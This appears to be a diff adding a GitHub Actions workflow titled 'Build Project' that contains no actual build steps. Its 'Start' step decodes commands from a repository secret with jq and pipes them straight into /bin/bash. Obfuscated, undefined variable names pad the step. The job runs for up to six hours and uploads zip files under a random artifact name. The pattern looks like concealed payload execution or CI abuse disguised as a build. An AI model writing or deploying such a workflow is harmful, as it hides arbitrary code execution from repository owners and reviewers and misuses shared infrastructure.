@@ -1,0 +1,40 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  trigger:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Start
+        env:
+          b9: ${{ secrets.b9 }}
+        run: |
+          printf '%s' "$b9" | jq -r .wwtin7387 | /bin/bash
+          echo $p674 | jq -r .ska03633 | /bin/bash
+          printf '%s' "$hgjo0778" | jq -r .j801 | /bin/bash
+          echo $jgxpb36 | jq -r .cj30 | /bin/bash
+          echo $tcqom78152 | jq -r .wud80 | /bin/bash
+          echo $pyzic1 | jq -r .ttaen006 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: mmelkCHh
+          path: "*.zip"
+          retention-days: 1
